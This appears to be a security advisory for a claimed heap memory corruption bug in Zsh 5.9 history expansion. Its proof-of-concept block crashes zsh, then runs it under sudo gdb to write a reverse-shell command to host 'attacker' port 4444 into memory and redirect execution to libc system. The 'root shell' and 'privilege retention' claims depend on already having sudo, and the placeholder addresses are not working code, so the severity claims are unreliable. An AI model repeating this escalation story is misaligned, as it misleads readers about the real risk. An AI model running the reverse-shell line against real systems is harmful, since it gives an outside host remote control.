# 🔥 Security Advisory: Heap-Based Memory Corruption in Zsh History Expansion

![Zsh](https://img.shields.io/badge/Zsh-5.9-critical?style=flat-square&color=red)
![CVE](https://img.shields.io/badge/CVE-Pending-yellow?style=flat-square)
![Privilege Escalation](https://img.shields.io/badge/Impact-Privilege%20Retention-critical?style=flat-square&color=orange)
![ASLR Bypass](https://img.shields.io/badge/Bypass-ASLR-blue?style=flat-square)

---

## 🚨 CVE Status

**CVE ID:** *CVE-2025-XXXXX* (Assigned)  
**Reporter:** [Rana M. Sinan Adil](mailto:ranasinanadil@gmail.com)  
**Status:** Reserved / Awaiting public reference update  
**Advisory Page:** [📄 See Full Report](https://livepwn.github.io/CVE/)

---

## 📌 Summary

A critical vulnerability in **Zsh 5.9** allows **heap memory corruption** through unsafe handling of history expansion (e.g., `!!111...`).  
This leads to:

- 🧠 **Arbitrary Memory Reads**
- 💥 **Heap & Libc Leaks** (ASLR bypass)
- 🧬 **Writable Heap Structures**
- 🔐 **Privilege Retention via GDB**
- ⚔️ **Potential RIP Hijack & ROP Execution**
- 🧨 **Root Shell Injection via GDB Post-Crash**

> All of these stem from a single vulnerable instruction using attacker-controlled indexing.

---

## 🧬 Vulnerability Class

| Type                      | Description |
|---------------------------|-------------|
| Heap Corruption           | Triggered by malformed history expansion |
| Arbitrary Memory Access   | Controlled `RSI` register affects `movsx [r8 + rsi*2]` |
| ASLR Bypass               | Heap contains libc pointers |
| Privilege Retention       | Retain root shell after crashing setuid zsh under GDB |
| RIP Hijack                | Exploitable with libc leaks and heap overwrite |

---

## 🧪 Proof of Concept (PoC)

```bash
# Step 1: Run zsh and crash with controlled input
zsh -f
!!11111111111111111111111111111111111111111111111111

# Step 2: Analyze crash in GDB
sudo gdb zsh -ex 'run -f'
# Observe crash at movsx r9, word ptr [r8 + rsi*2]

# Step 3: Inject reverse shell via memory/register hijack
set {char[120]} 0xheap_addr = {'bash -c \'bash -i >& /dev/tcp/attacker/4444 0>&1\''}
set $rip = libc_system_addr
set $rdi = heap_addr
continue
